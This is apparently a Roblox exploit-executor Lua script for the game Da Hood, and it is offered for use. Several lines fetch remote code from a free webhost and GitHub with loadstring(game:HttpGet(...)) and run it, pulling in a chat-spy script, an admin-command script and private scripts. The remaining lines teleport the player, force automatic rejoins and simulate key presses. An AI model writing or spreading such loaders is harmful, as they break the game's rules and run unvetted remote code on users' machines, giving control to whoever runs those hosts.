repeat wait() until game:IsLoaded()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dehoisted/Chat-Spy/main/source/main.lua"))();
if game.Players.LocalPlayer.Name == Settings.Main then
    wait(5)
    loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/DaHood.lua"))();
    loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/priv2.lua"))();
else
    loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/summon.lua"))();
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-194, -27, 336)
game:WaitForChild("CoreGui")
game:WaitForChild("Players")
 
print("REJOIN SCRIPT ENABLED")
 
game.CoreGui.RobloxPromptGui.promptOverlay.DescendantAdded:Connect(function()
    local GUI = game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt")
    if GUI then
        if GUI.TitleFrame.ErrorTitle.Text == "Disconnected" then
            if #game.Players:GetPlayers() <= 1 then
                game.Players.LocalPlayer:Kick("\nRejoining...")
                wait()
                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
            else
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
            end
        end
    end
end)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"X",false,game)
 
end
